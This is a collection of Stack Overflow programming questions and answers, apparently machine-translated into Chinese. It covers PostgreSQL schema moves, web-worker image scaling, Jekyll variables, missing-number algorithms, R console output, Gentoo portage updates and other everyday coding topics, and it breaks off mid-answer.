> 
> 标签：postgresql, schema, migrate, postgresql-9.1

我有一个 PostgreSQL 9.1 数据库，其中有 100 个左右的表被加载到“公共”模式中。我想将这些表（但不是“公共”中的所有函数）移动到“数据”模式。

我知道我可以使用以下内容一次移动 1 张桌子。

```
ALTER TABLE [tablename] SET SCHEMA [new_schema] 
```

是否可以在一次操作中将所有表移动到新模式？如果是这样，完成这项任务的最有效方法是什么？

* * *

## 回答 #1

> 赞同：61
> 
> 时间：2012-04-19T08:29:00.910

[DO](http://www.postgresql.org/docs/current/interactive/sql-do.html)会做的伎俩：

```
DO
$$
DECLARE
    row record;
BEGIN
    FOR row IN SELECT tablename FROM pg_tables WHERE schemaname = 'public' -- and other conditions, if needed
    LOOP
        EXECUTE 'ALTER TABLE public.' || quote_ident(row.tablename) || ' SET SCHEMA [new_schema];';
    END LOOP;
END;
$$; 
```

# javascript - 网络工作者和缩放图像

> ID：10218774
> 
> 赞同：10
> 
> 时间：2012-04-18T22:06:55.783
> 
> 标签：javascript, html, canvas

我需要在 Web Worker 中以数组形式缩放图像。如果我在网络工作者之外，我可以使用画布和 drawImage 来复制图像的某些部分或缩放它。

看起来像在网络工作者中我不能使用画布所以我能做什么？有没有可以帮助我的纯 Javascript 库？

提前非常感谢。

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-06-14T20:16:02.230

缩放可以通过多种方式完成，但它们都归结为从图像中删除或创建像素。由于图像本质上是像素值的矩阵（调整大小为数组），因此您可以将放大图像视为扩大该数组并填充空白，而缩小图像则视为通过省略值来缩小数组。

话虽如此，在 JavaScript 中编写自己的适用于数组的缩放函数通常并不难。由于我知道您已经拥有 JavaScript 数组形式的图像，您可以将该数组在消息中传递给 Web Worker，将其缩放为您的缩放函数并将缩放后的数组发送回主线程。

在表示方面，我建议您使用专为 RGBA（颜色，带 alpha 通道）编码的图像设计的 Uint8ClampedArray，它比普通的 JavaScript 数组更有效。您还可以轻松地将消息中的 Uint8ClampedArray 对象发送到您的 Web Worker，这样就不会有问题了。另一个好处是在 Canvas API 的 ImageData 数据类型（替换 CanvasPixelArray 之后）中使用了 Uint8ClampedArray。这意味着很容易在画布上绘制缩放图像（如果这是您想要的），只需使用 ctx.getImageData() 获取画布的 2D 上下文的当前 ImageData 并将其数据属性更改为您的缩放Uint8ClampedArray 对象。

顺便说一句，如果您还没有将图像作为数组，您可以使用相同的方法。首先在画布上绘制图像，然后使用当前 ImageData 对象的 data 属性在 Uint8ClampedArray 中检索图像。

关于放大图像的缩放方法，基本上有两个组件需要实现。第一个是将已知像素（即您正在缩放的​​图像中的像素）划分为您创建的更大的新数组。一个明显的方法是在空间上平均划分所有像素。例如，如果您将图像的宽度设置为两倍宽，您只需在每个像素之后跳过一个位置，在其间留下空白。

然后第二个组件是填写这些空白，这可能稍微不那么简单。但是，有几个相当容易。（另一方面，如果您对计算机视觉或图像处理有一定的了解，您可能希望了解一些更高级的方法。）一种简单且有些明显的方法是使用其最近邻（即最近已知像素值）通过复制已知像素的颜色。当您过度缩放图像时，这通常会导致更大像素（相同颜色的更大块）的效果。除了复制最近像素的颜色，您还可以取附近几个已知像素的平均值。甚至可能与权重相结合，平均而言，您使较近的像素比较远的像素计数更多。其他方法包括使用高斯模糊图像。如果您想了解哪种方法最适合您的应用程序，请查看有关图像插值的一些页面。当然，请记住，扩大规模总是意味着填补实际上​​并不存在的东西。如果你做得太多，那看起来总是很糟糕。

就按比例缩小而言，通常只是通过仅将选择的像素从当前阵列转移到较小的阵列来移除像素。例如，如果您想让图像的 with 小一倍，则以 2 的步长粗略地迭代当前数组（这在一定程度上取决于图像的尺寸，偶数或奇数，以及您的表示使用）。有一些方法可以通过删除那些最容易错过的像素来更好地做到这一点。但我对他们的了解还不够。

顺便说一句，所有这些实际上都与网络工作者无关。如果你想在主线程上用 JavaScript 缩放图像，你可以用完全相同的方式来做。或任何其他语言。然而，Web Worker 是在单独的线程上而不是在 UI 线程上进行这些计算的一种非常好的方法，这意味着网站本身似乎不会无响应。然而，就像你说的，所有涉及画布元素的事情都需要在主线程上完成，但是缩放数组可以在任何地方完成。

此外，我确信有 JavaScript 库可以为您执行此操作，并且根据它们的方法，您还可以使用 importScripts 将它们加载到您的 Web Worker 中。但我会说，在这种情况下，尝试自己编写它并根据您的目的量身定制它可能会更容易，也更有趣。

根据您的编程技能有多先进以及您需要扩展的速度，您始终可以尝试在 GPU 上而不是使用 WebGL 的 CPU 上执行此操作。但在这种情况下，这似乎有点矫枉过正。此外，您可以尝试将图像分成几部分，并尝试在多个 Web Worker 上缩放单独的部分，使其成为多线程。尽管稍后将这些部分组合起来肯定不是一件容易的事。当您有大量需要在客户端缩放的图像时，多线程可能更有意义。

这完全取决于您的应用程序、图像以及您自己的技能和愿望。

无论如何，我希望能大致回答你的问题。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-03-12T01:57:32.990

我觉得需要一些关于 mslatour 答案的细节，因为我只花了 6 个小时试图弄清楚如何“......简单地......将其数据属性更改为您的缩放 Uint8ClampedArray 对象”。去做这个：

① 从 web-worker 发回你的数组。使用表格：

```
self.postMessage(bufferToReturn, [bufferToReturn]); 
```

如果您不想这样做，可以在不复制缓冲区的情况下将缓冲区传入和传出 web worker。（这样更快。）（有[一些 MDN 文档](https://developer.mozilla.org/en-US/docs/Web/Guide/Performance/Using_web_workers#Passing_data_by_transferring_ownership_%28transferable_objects%29)，~~但我无法链接到它，因为我没有代表。对不起。~~) 无论如何，您也可以将第一个 bufferToReturn 放在列表或映射中，如下所示：

```
self.postMessage({buffer:bufferToReturn, width:500, height:500}, [bufferToReturn]); 
```

你使用类似的东西

```
webWorker.addEventListener('message', function(event) {your code here}) 
```

收听已发布的消息。（在这种情况下，发布的事件来自网络工作者，而进行监听的事件在您的普通 JS 代码中。它的工作方式与其他方式相同，只需切换“self”和“webWorker”变量。）

② 在您的浏览器端 Javascript（相对于 worker 端）中，您可以使用[imageData](https://developer.mozilla.org/en-US/docs/DOM/ImageData) .data.set() 来“简单地”更改数据属性并将其放回画布中。

```
var imageData = context2d.createImageData(width, height);
imageData.data.set(new Uint8ClampedArray(bufferToReturn));
context2d.putImageData(imageData, x_offset, y_offset); 
```

我要感谢[hacks.mozilla.org](https://hacks.mozilla.org/2011/12/faster-canvas-pixel-manipulation-with-typed-arrays/)提醒我 data.set() 方法的存在。

ps 我不知道有任何图书馆可以帮助解决这个问题……但是。对不起。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2014-10-30T02:45:42.107

我自己还没有测试过，但是这里有一个纯 JS 库可能有用：

[https://github.com/taisel/JS-Image-Resizer](https://github.com/taisel/JS-Image-Resizer)

# jekyll - Jekyll Front Matter 中的自定义变量

> ID：10218779
> 
> 赞同：15
> 
> 时间：2012-04-18T22:07:12.540
> 
> 标签：jekyll

Jekyll 新手，想知道是否可以在 Jekyll Front Matter 中包含自定义变量。这对于嵌套布局很有用，例如：

布局/艺术家.html

```
----
layout: default
title: {{ page.artist }} (Artist)
---- 
```

我尝试这样做时出错。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2016-06-14T00:28:50.363

目前，Jekyll 不支持前端的 Liquid 变量，唯一的方法是通过插件，例如**[jekyll-conrefifier](https://github.com/gjtorikian/jekyll-conrefifier)**。

* * *

或者，您可以做的是创建*在同一文件上*重复使用的变量：

```
{% assign new_title = page.title | append: " (Artist)" %}
<h1>{{ new_title }}</h1> 
```

您还可以将变量传递给包含在内的文件。例如，`_includes\display-post.html`通过将修改后的标题作为参数传递来包含文件：

```
{% assign new_title = page.title | append: " (Artist)" %}
{% include display-post.html post_title=new_title %} 
```

然后获取传入的值的值（的示例内容`_includes\display-post.html`）：

```
{% assign title_received = include.post_title %}

<h1>Title that as passed in: {{ title_received }}</h1> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-25T04:09:48.777

我不确定是否有办法正确地做到这一点（即服务器端），但权宜之计可能是在用户浏览器中设置正确标题的一小段 Javascript。例如

```
---
title: Default title blah blah
---

[... content ...]

<span id="pagetitle" style="display: none">{{ page.artist | escape }} (Artist)</span>

<script type="text/javascript">
    var pagetitle = document.getElementById("pagetitle");
    if (pagetitle) {
        document.title = pagetitle.textContent;
    }
</script> 
```

### 笔记：

替换`page.artist`是在 HTML 中而不是在 Javascript 中执行的，因为引用任何 HTML 特殊字符（通过`escape`）而不是 Javascript 特殊字符`'`或`"`或`\`（没有内置过滤器来执行此操作）更容易。

也可以将`pagetitle`span 移到页面顶部，使其靠近另一个 YAML 前端。

不幸的是，这是一种非常糟糕的实现方式，但看起来它可能是除了编写插件之外的唯一方法。

# c++ - C++ 2010：使用#include

> ID：10218782
> 
> 赞同：0
> 
> 时间：2012-04-18T22:07:31.943
> 
> 标签：c++

我疯狂地搜索，找不到答案。我正在尝试在我的 c++ 项目中使用 mysql 并且有 #include mysql.h 但我需要那个目录文件。一个存在吗？我设置了所有代码，但由于文件丢失，出现了无数错误。我正在关注一个教程，但他们没有解释从哪里获取该目录。任何帮助都会很棒。谢谢！！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-01T14:57:23.467

我知道我发布答案为时已晚，但仅用于文档目的和那些搜索相同错误的人。

*   下载mysql服务器。你可以从这里下载它：[http ://www.mysql.com/downloads/](http://www.mysql.com/downloads/)

下载社区服务器就够了。注意：选择 zip 文件。选择 x32，因为编译器会自动配置为使用 x32 配置进行构建。如果您打算将编译配置更改为 x64，请继续下载 x64 zip 文件。

*   下载 zip 文件后，创建新的空白项目。如果您使用的是 MSVC++Express2010，请打开项目属性 | C/C++ | 附加包含目录。将路径添加到在提取的文件夹中找到的包含文件夹。

*   将提取文件夹中 lib 文件夹中的库文件复制到可以找到 *.cpp 文件的项目目录中。

*   将以下行添加到您的代码中：

`#include <my_global.h>`

`#include <mysql.h>`

`#pragma comment(lib, "libmysql.lib")`

现在你准备好了:)

你可以试试[这里](http://www.nitecon.com/tutorials-articles/develop/cpp/c-mysql-beginner-tutorial/)找到的代码，看看事情是否正确。

# spring - 没有完整配置的弹簧自动线

> ID：10218788
> 
> 赞同：0
> 
> 时间：2012-04-18T22:07:56.347
> 
> 标签：spring, annotations

我在我的 2.5.6v 弹簧测试项目中使用了 @Autowired 和 @Qualifier 注释。

一切正常，这是我的问题。那是因为我没有在我的上下文文件中使用 AutowiredAnnotationBeanPostProcessor 或 <context:annotation-config /> 。

它是否设计为在没有 2 的情况下工作。我认为至少有一个是强制性的。

感谢您的建议

# c++ - 找到两个缺失的数字

> ID：10218791
> 
> 赞同：11
> 
> 时间：2012-04-18T22:08:07.000
> 
> 标签：c++, algorithm, math, discrete-mathematics

我们有一台内存为 O(1) 的机器，我们想在第一遍`n`中（一个接一个）传递数字，然后我们排除这两个数字，然后将`n-2`数字传递给机器。

编写一个查找缺失数字的算法。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-04-19T06:43:39.283

**它可以用 O(1) 内存来完成。**

您只需要几个整数来跟踪一些运行总和。整数不需要 log n 位（其中 n 是输入整数的数量），它们只需要 2b+1 位，其中 b 是单个输入整数中的位数。

当您第一次阅读流时，添加所有数字及其所有平方，即对于每个输入数字 n，请执行以下操作：

```
sum += n
sq_sum += n*n 
```

然后在第二个流上对两个不同的值 sum2 和 sq_sum2 执行相同的操作。现在做以下数学：

```
sum - sum2 = a + b
sq_sum - sq_sum2 = a^2 + b^2

(a + b)(a + b) = a^2 + b^2 + 2ab
(a + b)(a + b) - (a^2 + b^2) = 2ab
(sum*sum - sq_sum) = 2ab

(a - b)(a - b) = a^2 + b^2 - 2ab
               = sq_sum - (sum*sum - sq_sum) = 2sq_sum - sum*sum
sqrt(2sq_sum - sum*sum) = sqrt((a - b)(a - b)) = a - b
((a + b) - (a - b)) / 2 = b
(a + b) - b = a 
```

在所有中间结果中都需要 2b+1 位，因为您要存储两个输入整数的乘积，并且在一种情况下将其中一个值乘以 2。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-18T22:13:03.927

假设数字范围为 1..N 并且其中 2 个缺失 -`x`并且`y`，您可以执行以下操作：

使用高斯公式：`sum = N(N+1)/2`

```
sum - actual_sum = x + y 
```

使用数字的乘积：`product = 1*2..*N = N!`

```
product - actual_product = x * y 
```

解决 x,y 并且您有丢失的数字。

简而言之-遍历数组并将每个元素相加得到`actual_sum`，将每个元素相乘得到`actual_product`。然后求解 的两个`x`方程`y`。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-04-18T22:14:50.087

**它不能用`O(1)`内存来完成。**

假设您有恒定`k`的内存位 - 那么您`2^k`的算法可以有可能的状态。

但是 - 输入不受限制，并且假设对于不同的问题情况有`(2^k) + 1`可能的答案，根据[piegeonhole 原则](http://en.wikipedia.org/wiki/Pigeonhole_principle)，对于具有不同答案的 2 个问题，您将返回相同的答案两次，因此您的算法是错误的。`(2^k) + 1`

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-04-19T06:42:17.117

当我读完这个问题时，我想到了以下内容。但是上面的答案表明，使用 O(1) 内存是不可能的，或者应该对数字范围进行限制。如果我对问题的理解有误，请告诉我。好的，这就去

你有**O(1)**内存 - 这意味着你有**恒定的内存量**。

当**n 个**数字第一次传递给您时，只需继续将它们添加到一个变量中并继续将它们相乘到另一个变量中。**因此，在第一遍结束时，您将获得 2 个变量S1**和**P1**中所有数字的总和和乘积。到目前为止，您已经使用了 2 个变量（如果您读取内存中的数字，则为 +1）。

当第二次将**(n-2) 个**数字传递给您时，请执行相同操作。**将(n-2) 个**数字的总和和乘积存储在 2 个其他变量**S2**和**P2**中。到目前为止，您已经使用了 4 个变量（如果您读取内存中的数字，则 +1）。

如果两个缺失的数字是**x**和**y**，那么

```
x + y = S1 - S2
x*y = P1/P2; 
```

您在两个变量中有两个方程。解决它们。

因此，您使用了恒定数量的内存（与 n 无关）。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2016-06-21T19:41:25.497

```
void Missing(int arr[], int size)
{
  int xor = arr[0]; /* Will hold xor of all elements */
  int set_bit_no;  /* Will have only single set bit of xor */
  int i;
  int n = size - 2;
  int x = 0, y = 0;

  /* Get the xor of all elements in arr[] and {1, 2 .. n} */
  for(i = 1; i < size; i++)
    xor ^= arr[i];  
  for(i = 1; i <= n; i++)
    xor ^= i;   

  /* Get the rightmost set bit in set_bit_no */
  set_bit_no = xor & ~(xor-1);

  /* Now divide elements in two sets by comparing rightmost set
   bit of xor with bit at same position in each element. */
  for(i = 0; i < size; i++)
  {
    if(arr[i] & set_bit_no)
      x = x ^ arr[i]; /*XOR of first set in arr[] */
    else
      y = y ^ arr[i]; /*XOR of second set in arr[] */
  }
  for(i = 1; i <= n; i++)
  {
    if(i & set_bit_no)
      x = x ^ i; /*XOR of first set in arr[] and {1, 2, ...n }*/
    else
      y = y ^ i; /*XOR of second set in arr[] and {1, 2, ...n } */
  }

  printf("\n The two repeating missing elements are are %d & %d ", x, y);
} 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2018-09-05T22:24:28.017

请查看下面的解决方案链接。它解释了 XOR 方法。这种方法比上面解释的任何方法都更有效。它可能与上面的 Victor 相同，但有一个解释为什么会这样。

[解决方案在这里](https://www.geeksforgeeks.org/find-two-missing-numbers-set-2-xor-based-solution/)

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2020-06-07T18:09:00.553

这是不需要任何二次公式或乘法的简单解决方案：

假设 B 是两个缺失数字的总和。

两个缺失数字的集合将来自：(1,B-1),(2,B-1)...(B-1,1)

因此，我们知道这两个数字之一将小于或等于 B 的一半。

我们知道我们可以计算 B（两个缺失数字的总和）。

因此，一旦我们有了 B，我们将找到列表中小于或等于 B/2 的所有数字的总和，然后从 (1 到 B/2) 的总和中减去该总和，得到第一个数字。然后，我们通过从 B 中减去第一个数字得到第二个数字。在下面的代码中，rem_sum 是 B。

```
public int[] findMissingTwoNumbers(int [] list, int N){
    if(list.length == 0 || list.length != N - 2)return new int[0];

    int rem_sum = (N*(N + 1))/2;
    for(int i = 0; i < list.length; i++)rem_sum -= list[i];

    int half = rem_sum/2;
    if(rem_sum%2 == 0)half--; //both numbers cannot be the same
    int rem_half = getRemHalf(list,half);

    int [] result = {rem_half, rem_sum - rem_half};
    return result;
}
private int getRemHalf(int [] list, int half){
    int rem_half = (half*(half + 1))/2;
    for(int i = 0; i < list.length; i++){
        if(list[i] <= half)rem_half -= list[i];
    }
    return rem_half;
} 
```

# php - 如何使用 jQuery 在 HTML 中添加换行符

> ID：10218793
> 
> 赞同：3
> 
> 时间：2012-04-18T22:08:30.857
> 
> 标签：php, jquery, html, css

“换行符”不是指`<br />`标签。相反，我的意思是 HTML 中的实际换行符本身，如下所示：

```
<html>
    <body> <--This is on a new line 
```

我有一组 div，`display:inline-block`这取决于以下内容`<div>`是在新行上还是在同一行上，它的显示方式略有不同。在 PHP 中生成这些 div 要求它们位于新行上。问题是我需要在 jQuery 中使用 a 生成这些相同的 div `$(this).clone().appendTo(element)`，但我不知道如何使用 jQuery 添加换行符。

那么是否有某种技巧可以将这些 div 附加到新行上，或者某种 css 属性会以任何一种方式显示它？

这是我的 html 使用 PHP 的样子：

```
<div>
    <label>Input label</label>
    <input type="text" />
</div>
<div>
    <label>Input label</label>
    <input type="text" />
</div> 
```

这就是使用 jQuery 的感觉：

```
<div>
    <label>Input label</label>
    <input type="text" />
</div><div>
    <label>Input label</label>
    <input type="text" />
</div> 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-18T22:16:43.080

在您用于 html 的字符串中，使用`\n`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-18T22:20:03.180

您的 PHP 可能看起来像这样...（仅显示相关部分）

```
echo '</div>';
echo '<div>'; 
```

添加回声...

```
echo '</div>';
echo "\n";
echo '<div>'; 
```

# ruby - 这个“电话词”算法的 Big-O 复杂度是多少？

> ID：10218794
> 
> 赞同：1
> 
> 时间：2012-04-18T22:08:31.747
> 
> 标签：ruby, algorithm, loops

这不是作业，只是我在网上发现的一个看起来很有趣的面试问题。

所以我首先看了一下：[电话用语问题](https://stackoverflow.com/questions/7540877/telephone-words-problem)——但它似乎措辞不当/引起了一些争议。我的问题几乎相同，除了我的问题更多是关于它背后的时间复杂度。

当给定一个 10 位数的电话号码作为输入时，您希望列出所有可能的单词。所以这就是我所做的：`

```
def main(telephone_string)
  hsh = {1 => "1", 2 => ["a","b","c"], 3 => ["d","e","f"], 4 => ["g","h","i"], 
         5 => ["j","k","l"], 6 => ["m","n","o"], 7 => ["p","q","r","s"], 
         8 => ["t","u","v"], 9 => ["w","x","y","z"], 0 => "0" }
  telephone_array = telephone_string.split("-")
  three_number_string = telephone_array[1]
  four_number_string = telephone_array[2]
  string = ""
  result_array = []
  hsh[three_number_string[0].to_i].each do |letter|
    hsh[three_number_string[1].to_i].each do |second_letter|
      string = letter + second_letter
      hsh[three_number_string[2].to_i].each do |third_letter|
        new_string = string + third_letter
        result_array << new_string
      end
    end 
  end

  second_string = ""
  second_result = []
  hsh[four_number_string[0].to_i].each do |letter|
    hsh[four_number_string[1].to_i].each do |second_letter|
      second_string = letter + second_letter
      hsh[four_number_string[2].to_i].each do |third_letter|
        new_string = second_string + third_letter
        hsh[four_number_string[3].to_i].each do |fourth_letter|
          last_string = new_string + fourth_letter
          second_result << last_string
        end
      end
   end
end
  puts result_array.inspect
  puts second_result.inspect
end 
```

首先，这是我在几分钟内完成的，没有进行任何重构。所以我为混乱的代码道歉，我刚开始学习 Ruby 6 周前，所以请多多包涵！

所以**最后**我的问题是：我想知道这种方法的时间复杂度是多少。我的猜测是它会是 O(n^4) 因为第二个循环（对于四个字母的单词）嵌套了四次。虽然我不是很积极。所以我想知道这是否正确，以及是否有更好的方法来解决这个问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-19T00:57:43.893

这实际上是一个恒定时间算法，所以 O(1)（或者更明确地说，O(4^3 + 4^4)）

这是一个恒定时间算法的原因是，对于电话号码中的每个数字，您都在迭代一个固定数量（最多 4 个）可能的字母，这是事先已知的（这就是为什么您可以将`hsh`静态放入您的方法中） .

一种可能的优化是当您知道没有带有当前前缀的单词时停止搜索。例如，如果 3 位数字是“234”，您可以忽略所有以“bd”开头的字符串（有一些 bd 词，例如“bdellid”，但没有一个是 3 字母的，至少在我的/usr/share/dict/words）。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2014-03-20T23:05:05.817

从最初的措辞，我会假设这是请求所有的可能性，而不是作为输出的可能性的数量。

不幸的是，如果您需要返回每个组合，则无法将复杂性降低到指定键确定的复杂性以下。

如果它只是数字，它可能是恒定的时间。但是，要将它们全部打印出来，最终结果很大程度上取决于假设：

1）假设您要检查的所有单词都是由字母组成的，您只需要检查从2到9的八个键。如果不正确，只需在下面的函数中减去8。

2）假设所有键的布局与此处设置的完全相同（没有八角形或星号），空数组的内容在最后一个单词中不占空间。

```
{
  1 => [],
  2 => ["a", "b", "c"],
  3 => ["d", "e", "f"],
  4 => ["g", "h", "i"], 
  5 => ["j", "k", "l"],
  6 => ["m", "n", "o"],
  7 => ["p", "q", "r", "s"],
  8 => ["t", "u", "v"],
  9 => ["w", "x", "y", "z"],
  0 => []
} 
```

在每个阶段，您只需检查下一步的可能性数量，并将每个可能的选择附加到字符串的末尾。如果你要这样做，那么最短时间将（基本上）是恒定时间（0，如果数字由全1和0组成）。但是，函数将是 O(4^n)，其中 n 在 10 处达到最大值。如果每次达到 7 或 9，则最大可能的组合数将是 4^10。

至于您的代码，我会推荐一个带有几个基本嵌套循环的循环。这是代码，在 Ruby 中，虽然我没有运行它，所以可能存在语法错误。

```
def get_words(number_string)
  hsh = {"2" => ["a", "b", "c"], 
         "3" => ["d", "e", "f"], 
         "4" => ["g", "h", "i"], 
         "5" => ["j", "k", "l"], 
         "6" => ["m", "n", "o"], 
         "7" => ["p", "q", "r", "s"], 
         "8" => ["t", "u", "v"], 
         "9" => ["w", "x", "y", "z"]}

  possible_array =  hsh.keys
  number_array = number_string.split("").reject{|x| possible_array.include?(x)}

  if number_array.length > 0
    array = hsh[number_array[0]]
  end

  unless number_array[1,-1].nil?
        number_array.each do |digit|
            new_array = Array.new()
            array.each do |combo|
                hsh[digit].each do |new|
                new_array = new_array + [combo + new]
            end
        end
        array = new_array
    end
    new_array
end 
```

# arcgis - 如何将地图发布到网络？

> ID：10218795
> 
> 赞同：0
> 
> 时间：2012-04-18T22:08:43.587
> 
> 标签：arcgis, arcgis-server

刚开始在工作中使用 ArcGIS 服务器，我之前没有经验，但我负责在网络上显示我们的地图。

我有一个在服务器上运行的 ArcGIS 服务器，并且我在我的桌面上使用 ArcMap 10。我在保存地图文档的服务器中创建了一个文件夹。我可以使用此文档添加新服务，并且在我这样做时会获得一个 url。但是当我转到那个 URL 时，我得到了这个错误：

`Server Error in '/ArcGIS/Services' Application. Runtime Error`

而且，当从服务器访问相同的 url 时，我得到： `Server Error in '/ArcGIS/Services' Application. No Content`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-27T05:20:29.837

您是否尝试通过浏览器打开 servername/ArcGIS/services？此 url 用于 SOAP 请求，例如，您可以添加 '?wsdl' 以获取 SOAP 服务描述。要在浏览器中使用它，您需要 ArcGIS Server REST API，即使用“servername/ArcGIS/ **rest** /services”URL。

# r - 有没有更简单的方法可以在 R 中使用 cat 擦除行尾？

> ID：10218796
> 
> 赞同：1
> 
> 时间：2012-04-18T22:08:45.227
> 
> 标签：r

我喜欢在我的脚本中使用它：

```
cat("Saving...")
do_something_slow()
cat("\rSaved\n") 
```

问题是应用回车而不删除行的其余部分，所以我得到了这个：

```
Savedg... 
```

要修复它，我可以这样做：

```
cat("\rSaved\033[K\n") 
```

但这有点难看。有没有更简单的方法？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-18T22:49:29.820

我喜欢使用`message()`而不是`cat()`生成消息。例如：

`cat("Saving..."); cat("\rSaved\n")`

返回：

```
Savdg... 
```

尽管：

`message("Saving..."); message("\rSaved\n")`

返回：

```
Saving...
Saved 
```

**编辑：**

受@gauden 回答的启发，另一个功能可能是：

```
replaceMessage <- function(x, width = 80)
{
    message("\r", rep(" ", times = width - length(x)), "\r", appendLF = F)
    message(x, appendLF = F)
} 
```

接着：

```
replaceMessage("Saving..."); Sys.sleep(1); replaceMessage("Saved\n") 
```

**笔记：**

虽然`replaceMessage()`在 Linux 和 Windows 上的 Rterm 中表现如预期，但在我的 Rgui（2.15.0，Windows x64）中表现很奇怪。具体来说，`Saving...`从不显示，在`Saved`显示之后，光标`width`向右移动空格（本例中为 80 个空格）。我不确定为什么。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-04-18T22:59:22.563

假设您希望消息全部连续显示在一行上，那么异想天开的东西怎么样？

```
cleancat <- function(astring, width=80) {
    # Reserves a line of 80 (default) characters
    # and uses it for serial updates
    require("stringr")
    astring <- paste("\r", astring, sep="")
    cat(str_pad(astring, 80, "right"))
    # pretend to do something slow
    # delete this line if cleancat is used in production
    Sys.sleep(0.5) 
}

# imitate printing a series of updates
test <- lapply(c("Saving -", 
                 "Saving \\", 
                 "Saving |", 
                 "Saving /", 
                 "Saving -", 
                 "Saving \\", 
                 "Saving |", 
                 "Saving /", 
                 "Saved"), cleancat) 
```

当然，您需要在您可能认为更丑陋的环境中加载`stringr`包并设置功能......`cleancat`

# linux - 删除 /usr/portage 文件夹 Gentoo

> ID：10218800
> 
> 赞同：0
> 
> 时间：2012-04-18T22:09:01.360
> 
> 标签：linux, root, gentoo

我的电脑上有一个基于 Gentoo 的 Linux 操作系统。但是portage树太老了，所以在安装一些应用程序时会出现错误。

我下载了一个新的 portage 快照来替换我的旧快照。但我无法删除我的 /usr/portage 文件夹，因为其中包含的所有文件都是只读的。

作为root，我运行`rm -rf /usr/portage`将其删除。

如何删除 portage 文件夹以将新的 portage 快照放在那里？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-19T09:14:04.840

更新portage树的正常程序是

```
emerge --sync 
```

您还应该查看[Gentoo 手册](http://www.gentoo.org/doc/en/handbook/handbook-x86.xml?part=2&chap=1)。

为什么不能这样更新？

# vb6 - VB6 变体类型

> ID：10218803
> 
> 赞同：3
> 
> 时间：2012-04-18T22:09:20.620
> 
> 标签：vb6

我来自面向对象的背景。为什么在此代码片段中（在消息框中）显示“测试”（注意引号）。我希望逻辑测试：'If Test = "True"' 返回 False，因为变量包含布尔值而不是字符串。因此，我不希望出现消息框，但确实如此：

```
Dim Test As Variant

Test = True

If Test = "True" Then //line 5
    MsgBox ("Test")
End If 
```

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-04-18T22:28:41.987

`Variant`VB6（以及支持它们的大多数其他语言）中的类型值会根据需要在数据类型之间自动转换；它们广泛用于 COM 交互。

您正在使用的代码在这里使用从布尔到字符串的自动（隐式）转换：

```
if Test = "True" 
```

在这里使用它作为它的原始分配类型（布尔值）之后

```
Test = True 
```

但是，在这里，您根本没有使用该变体；您使用的是硬编码字符串`"Test"`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-19T02:03:52.910

他们之所以在 MessageBox 中出现 Test 一词是因为您在消息框中显示了字符串“Test”

```
MsgBox ("Test") 
```

你应该使用这个

```
MsgBox (Test) 
```

# mysql - 这个 MySQL 到 HQL 的转换是否正确？

> ID：10218810
> 
> 赞同：-2
> 
> 时间：2012-04-18T22:09:48.000
> 
> 标签：mysql, hibernate, hql

请帮忙。这个 MySQL 语法到 HQL 的转换是否正确？

MySQL：

```
SELECT item.* FROM item, itemGroup
WHERE item.groupId = itemGroup.groupId
AND itemGroup.display = 1
ORDER BY itemGroup.displayOrder ASC 
```

总部：

```
FROM item AS I, itemGroup AS IG
WHERE I.groupId = IG.groupId
AND IG.display = 1
ORDER BY IG.displayOrder ASC 
```

谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T06:43:41.593

可能它不正确（除非您使用 - 违反任何约定 - 类名的小写）。

在 HQL 中，您不使用数据库中的表名或列名。相反，您使用映射类和 getter/setter 或成员变量的名称。

此外，您最好只选择一个类，加入的类 Hibernate 将自动加入。它可能是这样的：

```
FROM Item AS i
   WHERE i.itemGroup.display = 1
   ORDER BY i.itemGroup.displayOrder ASC 
```

您必须在映射文件中指定 item 和 itemGroup 之间的连接。或者，您可以在 HQL 语句中使用“内部连接”子句。

# c# - 通过列表 从 javascript 到控制器

> ID：10218811
> 
> 赞同：6
> 
> 时间：2012-04-18T22:09:49.917
> 
> 标签：c#, javascript

我正在尝试将 a`List<int>`从 my传递`View`到 my `Controller`。我尝试了多种方法，使用不同的参数。没运气。

我目前正在尝试`{[4,5,13]}`使用参数传递给方法`List<int> ids`。

发送数字列表或数组的正确格式是什么？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-18T22:14:51.243

我相信你必须传递这样的东西：

```
{"ids":[4,5,13]} 
```

如果您使用的是 AJAX，那么我记得我必须设置`traditional`为 true [（请参阅 jquery ajax 文档）](http://api.jquery.com/jQuery.ajax/)，这样才能正确解析参数。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-29T16:19:35.230

AJAX方式：

[来自AJAX](http://api.jquery.com/jQuery.ajax/)的 jquery 文档：

> ### 数据
> 
> **类型：** PlainObject 或 String
> 要发送到服务器的数据。如果还不是字符串，则将其转换为查询字符串。它附加到 GET 请求的 url。请参阅 processData 选项以防止此自动处理。对象必须是键/值对。如果 value 是一个数组，jQuery 会根据传统设置的值（如下所述）序列化具有相同键的多个值。
> 
> ### 传统的
> 
> **类型：** Boolean
> 如果您希望使用传统的[参数序列化](http://api.jquery.com/jQuery.param)风格，请将其设置为 true 。

```
var roleList = new Array();
var usrId = "testuser";

/* one  way of adding items to array */
